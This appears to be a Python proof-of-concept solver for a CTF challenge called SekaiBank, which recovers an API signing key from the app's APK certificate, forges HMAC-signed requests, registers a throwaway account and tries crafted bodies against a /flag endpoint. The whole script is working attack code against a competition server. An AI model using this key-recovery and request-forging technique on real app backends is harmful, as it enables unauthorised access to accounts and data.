#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse, os, sys, json, re, hashlib, hmac, zipfile, struct, random, string, requests
from urllib.parse import urljoin, urlparse
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

BASE = "https://sekaibank-api.chals.sekai.team/api/"
KNOWN_KEY = "3f3cf8830acc96530d5564317fe480ab581dfc55ec8fe55e67dddbe1fdb605be"
UA = "okhttp/4.11.0"

def find_sig_block(b):
    magic=b"APK Sig Block 42"; off=b.rfind(magic)
    if off<8: raise RuntimeError("no v2 block")
    size=struct.unpack("<Q", b[off-8:off])[0]
    st=off-8-size; en=off+len(magic)
    if not(0<=st<en<=len(b)): raise RuntimeError("bad v2 block")
    return b[st:en]

def cert_sha256_from_block(block):
    best=None
    for i in range(len(block)-4):
        if block[i]==0x30 and block[i+1]==0x82:
            L=int.from_bytes(block[i+2:i+4],"big"); end=i+4+L
            if 500<=L<=4096 and end<=len(block):
                win=block[i:i+200]
                if (b"\x06\x03\x55\x04" in win) or (b"\x06\x09\x2a\x86\x48\x86\xf7\r\x01\x01" in win) or (b"\x06\x08\x2a\x86\x48\xce\x3d\x04\x03" in win):
                    der=block[i:end]; sha=hashlib.sha256(der).hexdigest()
                    if best is None or len(der)>best[0]: best=(len(der), sha)
    if not best: raise RuntimeError("no cert der")
    return best[1]

def extract_key_from_apk(path):
    with open(path,"rb") as f: data=f.read()
    return cert_sha256_from_block(find_sig_block(data))

def api_path(base, full):
    base = base[:-1] if base.endswith("/") else base
    return full[len(base):] if full.startswith(base) else urlparse(full).path

def body_str(method, json_body, files_body):
    if method in ("POST","PUT","PATCH","DELETE"):
        if json_body is not None:
            return json.dumps(json_body, separators=(",",":"), ensure_ascii=False)
        if files_body is not None:
            return "{}"
    return "{}"

def x_sig(method, base, path, bstr, key_hex):
    full = urljoin(base, path.lstrip("/"))
    to_sign = f"{method}/api{api_path(base, full)}{bstr}"
    return hmac.new(bytes.fromhex(key_hex), to_sign.encode("utf-8"), hashlib.sha256).hexdigest().lower()

class Client:
    def __init__(self, key, base=BASE):
        self.key=key; self.base=base; self.s=requests.Session()
        self.s.headers.update({"User-Agent":UA,"Connection":"close","Content-Type":"application/json"})
        retries=Retry(total=4,backoff_factor=0.4,status_forcelist=[502,503,504],allowed_methods=["GET","POST","PUT","PATCH","DELETE"])
        ad=HTTPAdapter(max_retries=retries); self.s.mount("https://",ad); self.s.mount("http://",ad)
        self.access=None; self.refresh=None

    def _req(self, method, path, json_body=None, auth=False, extra_headers=None):
        url = urljoin(self.base, path.lstrip("/"))
        bstr = body_str(method, json_body, None)
        headers={"X-Signature": x_sig(method, self.base, path, bstr, self.key)}
        if extra_headers: headers.update(extra_headers)
        if auth and self.access: headers["Authorization"]="Bearer "+self.access
        return self.s.request(method, url, headers=headers, json=json_body, timeout=20)

    def health(self): return self._req("GET","/health")
    def register(self,u,p,e):
        r=self._req("POST","/auth/register",{"username":u,"password":p,"email":e})
        try:
            js=r.json(); data=js.get("data") or js
            self.access = data.get("accessToken") or self.access
            self.refresh = data.get("refreshToken") or data.get("refresh_token") or self.refresh
        except: pass
        return r
    def login(self,u,p):
        r=self._req("POST","/auth/login",{"username":u,"password":p})
        try:
            js=r.json(); data=js.get("data") or js
            self.access = data.get("accessToken") or self.access
            self.refresh = data.get("refreshToken") or data.get("refresh_token") or self.refresh
        except: pass
        return r
    def refresh_token(self):
        if not self.refresh: return None
        r=self._req("POST","/auth/refresh",{"refreshToken": self.refresh}, auth=False)
        try:
            js=r.json(); data=js.get("data") or js
            self.access = data.get("accessToken") or self.access
            self.refresh = data.get("refreshToken") or data.get("refresh_token") or self.refresh
        except: pass
        return r
    def pin_setup(self,pin):  return self._req("POST","/auth/pin/setup", {"pin":pin}, auth=True)
    def pin_verify(self,pin): return self._req("POST","/auth/pin/verify",{"pin":pin}, auth=True)

    def post_flag(self, path, body, use_auth=True, accept=None):
        eh={"Accept": accept} if accept else None
        return self._req("POST", path, json_body=body, auth=use_auth, extra_headers=eh)

def looks_unmasked(txt:str)->bool:
    return bool(re.search(r"[A-Z0-9]{3,}\{[^}]+\}", txt)) and not bool(re.search(r"\{\*+\}", txt))

def main():
    ap=argparse.ArgumentParser(description="SekaiBank unmask PoC")
    ap.add_argument("--apk", default=os.environ.get("SEKAI_APK","SekaiBank.apk"))
    ap.add_argument("--key")
    ap.add_argument("--pin", default="123456")  # сервер требует ровно 6 цифр
    ap.add_argument("--token"); ap.add_argument("--refresh")
    ap.add_argument("--base", default=BASE)
    args=ap.parse_args()

    key = (args.key or "")
    if not key:
        try:
            if os.path.exists(args.apk):
                key = extract_key_from_apk(args.apk); print("[i] Key from APK:", key)
            else:
                key = KNOWN_KEY; print("[i] Using known key:", key)
        except Exception as e:
            key = KNOWN_KEY; print("[!] APK extract failed:", e, "\n[i] Using known key:", key)

    cli=Client(key, args.base)
    h=cli.health(); print("[*] /health ->", h.status_code, h.text[:120])

    if args.token: cli.access=args.token
    if args.refresh: cli.refresh=args.refresh

    if not cli.access:
        uname="ctf"+''.join(random.choices(string.ascii_lowercase+string.digits,k=6))
        pwd="P@ssw0rd!"+''.join(random.choices(string.digits,k=3))
        email=f"{uname}@example.com"
        r1=cli.register(uname,pwd,email); print("[*] register",uname,"->",r1.status_code, r1.text[:120])
        r2=cli.login(uname,pwd);          print("[*] login ->",r2.status_code, r2.text[:120])

    # PIN setup & verify (6 digits)
    ps=cli.pin_setup(args.pin);  print("[*] pin setup ->",  ps.status_code, ps.text[:200])
    pv=cli.pin_verify(args.pin); print("[*] pin verify ->", pv.status_code, pv.text[:200])

    # refresh to get token with pinVerified claim
    rr=cli.refresh_token()
    if rr is not None:
        print("[*] refresh ->", rr.status_code, rr.text[:140])

    # Try multiple bodies/endpoints
    tries = [
        ("/flag", {"unmask_flag": True}, True, None),
        ("/flag", {"pinVerified": True}, True, None),
        ("/flag", {"unmask_flag": True, "pinVerified": True}, True, None),
        ("/flag", {"unmaskFlag": True}, True, None),
        ("/flag", {"unmaskFlag": True, "pinVerified": True}, True, None),
        ("/flag", {}, True, "text/plain"),
        ("/flag", {"reveal": True}, True, "text/plain"),
        ("/user/flag", {"unmask_flag": True, "pinVerified": True}, True, None),
        # fallbacks without auth just in case
        ("/flag", {"unmask_flag": True, "pinVerified": True}, False, None),
    ]

    for path, body, auth, accept in tries:
        r = cli.post_flag(path, body, use_auth=auth, accept=accept)
        lead = r.text.strip()[:300]
        print(f"[*] POST {path} auth={auth} body={json.dumps(body,separators=(',',':'))} accept={accept} -> {r.status_code}")
        print("    ", lead)
        if looks_unmasked(r.text):
            m=re.search(r"([A-Z0-9]{3,}\{[^}]+\})", r.text)
            print("\n[+] FLAG:", m.group(1))
            return

    print("[!] Still masked. Try different bodies or share latest responses to tweak.")

if __name__=="__main__":
    main()
